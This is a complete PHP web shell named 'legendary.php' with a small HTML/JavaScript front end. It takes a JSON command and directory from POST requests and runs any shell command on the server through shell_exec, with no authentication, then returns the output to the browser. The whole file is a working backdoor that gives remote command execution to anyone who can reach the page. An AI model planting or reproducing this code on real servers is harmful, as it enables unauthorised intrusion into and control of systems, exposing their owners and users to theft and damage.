<?php

ini_set('display_errors',1);
ini_set('display_startup_errors',1);

$json = file_get_contents('php://input');

if ($json != "") {
    //WE RECEIVED A COMMAND
    $data = json_decode($json, true);
    $curDir = $data['dir'];
    $curDir = str_replace("\n","",$curDir);
    chdir($curDir);
    $cmd = $data['cmd'];
    if (strpos($cmd, "cd") !== false) {
        $params = explode("cd ",$cmd);
        $params = $params[1];
        chdir($params);
        $out = '';
    }
    else {
        $out = shell_exec($cmd); //Exec any command
        $out = htmlspecialchars($out);
        $out = str_replace("\n","<br>",$out); //Human-readable
    }
    $curDir = getcwd(); //Path after operation?

    $result = array();
    $result['dir'] = $curDir;
    $result['out'] = $out;
    header('Content-type: application/json');
    echo json_encode($result);
    exit(); //Nothing else should be printed :)
}

//ELSE THIS IS THE FIRST INTERACTION WITH THE PAGE
$curDir = getcwd();
?>

<!DOCTYPE html>
<html>
<body>
<script>
    function performSimpleAjaxRequest(value, target, handler) {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                handler(xmlhttp.responseText);
            }
        };
        xmlhttp.open("POST", target, true);
        xmlhttp.setRequestHeader("Content-Type", "application/json");
        xmlhttp.send(value);
    }

    function printOutput(result) {
        var data = JSON.parse(result);
        var out = data['out'];
        var dir = data['dir'];

        var curDir = document.getElementById('dir');
        curDir.value = dir;
        var dirOut = document.getElementById('dirOut');
        dirOut.innerHTML = dir;
        var output = document.getElementById('out');
        output.innerHTML = out;
    }

    function executeCommand() {
        var target = 'legendary.php';
        var dir = document.getElementById('dir').value;
        var cmd = document.getElementById('cmd').value;
        document.getElementById('cmd').value = '';
        var json = Object();
        json['dir'] = dir;
        json['cmd'] = cmd;
        performSimpleAjaxRequest(JSON.stringify(json),target,printOutput);
    }
</script>
<p>Current path: <span id="dirOut"><?= $curDir ?></span></p>
<form method="post" onsubmit="executeCommand(); return false;">
    <label for="cmd">Next command: </label><input type="text" name="cmd" placeholder="Enter a command" id="cmd" autocomplete="off">
    <input type="hidden" name="dir" id="dir" value="<?= $curDir ?>" autocomplete="off">
    <button type="button" onclick="executeCommand()">Execute</button>
</form>
<hr><br>
<h3>Output:</h3>
<p id="out"></p>
</body>
</html>
